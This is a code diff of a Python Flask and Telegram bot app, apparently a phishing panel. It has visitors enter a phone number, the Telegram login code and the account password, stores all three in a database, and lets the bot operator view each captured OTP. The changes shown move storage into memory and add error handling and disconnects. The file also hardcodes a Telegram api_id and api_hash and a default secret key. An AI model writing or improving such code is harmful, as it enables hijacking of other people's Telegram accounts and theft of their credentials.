@@ -17,17 +17,20 @@ app.secret_key = os.getenv("SECRET_KEY", "supersecretkey")
 # ========== KONFIG ==========
 api_id = int(os.getenv("API_ID", 16047851))
 api_hash = os.getenv("API_HASH", "d90d2bfd0b0a86c49e8991bd3a39339a")
-BOT_TOKEN = os.getenv("BOT_TOKEN", "YOUR_BOT_TOKEN")
-
-# Folder sessions dan database path
+BOT_TOKEN = os.getenv("BOT_TOKEN", "")
 SESSION_DIR = "/tmp/sessions"
-DB_PATH = "/tmp/users.db"
+
 os.makedirs(SESSION_DIR, exist_ok=True)
 
-# ====== DB INIT ======
+# ========== DB MEMORY ==========
+DB_PATH = "file:users?mode=memory&cache=shared"
+
+def get_conn():
+    return sqlite3.connect(DB_PATH, uri=True, check_same_thread=False)
+
 def init_db():
     try:
-        conn = sqlite3.connect(DB_PATH, check_same_thread=False)
+        conn = get_conn()
         cur = conn.cursor()
         cur.execute("""
             CREATE TABLE IF NOT EXISTS users (
@@ -38,13 +41,13 @@ def init_db():
         """)
         conn.commit()
         conn.close()
-        print("[DB] ✅ Database siap di:", DB_PATH)
+        print("[DB] ✅ Database siap (memory)")
     except Exception as e:
         print("[DB] ❌ Error init_db:", e)
 
 def save_user(phone, otp=None, password=None):
     try:
-        conn = sqlite3.connect(DB_PATH, check_same_thread=False)
+        conn = get_conn()
         cur = conn.cursor()
         cur.execute("""
             INSERT INTO users (phone, otp, password)
@@ -58,20 +61,28 @@ def save_user(phone, otp=None, password=None):
         print("[DB] ❌ Error save_user:", e)
 
 def get_user(phone):
-    conn = sqlite3.connect(DB_PATH, check_same_thread=False)
-    cur = conn.cursor()
-    cur.execute("SELECT phone, otp, password FROM users WHERE phone=?", (phone,))
-    row = cur.fetchone()
-    conn.close()
-    return row
+    try:
+        conn = get_conn()
+        cur = conn.cursor()
+        cur.execute("SELECT phone, otp, password FROM users WHERE phone=?", (phone,))
+        row = cur.fetchone()
+        conn.close()
+        return row
+    except Exception as e:
+        print("[DB] ❌ Error get_user:", e)
+        return None
 
 def get_all_users():
-    conn = sqlite3.connect(DB_PATH, check_same_thread=False)
-    cur = conn.cursor()
-    cur.execute("SELECT phone FROM users")
-    rows = cur.fetchall()
-    conn.close()
-    return [r[0] for r in rows]
+    try:
+        conn = get_conn()
+        cur = conn.cursor()
+        cur.execute("SELECT phone FROM users")
+        rows = cur.fetchall()
+        conn.close()
+        return [r[0] for r in rows]
+    except Exception as e:
+        print("[DB] ❌ Error get_all_users:", e)
+        return []
 
 # ====== Helper session files ======
 def remove_session_files(phone_base: str):
@@ -118,6 +129,7 @@ def login():
             flash("OTP telah dikirim ke Telegram Anda.")
             return redirect(url_for("otp"))
         except Exception as e:
+            print("[APP] ❌ Error send_code:", e)
             flash(f"Error kirim OTP: {e}", "error")
             return redirect(url_for("login"))
     return render_template("login.html")
@@ -148,6 +160,7 @@ def otp():
                 await client.disconnect()
                 return {"ok": False, "error": "OTP salah"}
             except Exception as e:
+                await client.disconnect()
                 print("[APP] ❌ verify_code error:", e)
                 return {"ok": False, "error": str(e)}
 
@@ -191,6 +204,7 @@ def password():
                 await client.disconnect()
                 return {"ok": False, "error": "Password salah"}
             except Exception as e:
+                await client.disconnect()
                 print("[APP] ❌ verify_password error:", e)
                 return {"ok": False, "error": str(e)}
 
@@ -288,6 +302,9 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await query.edit_message_text(f"⚠️ OTP belum tersedia untuk {phone}.")
 
 def start_bot():
+    if not BOT_TOKEN:
+        print("[BOT] ⚠️ BOT_TOKEN tidak diatur, bot tidak dijalankan")
+        return
     application = Application.builder().token(BOT_TOKEN).build()
     application.add_handler(CommandHandler("start", start))
     application.add_handler(CallbackQueryHandler(button_handler))
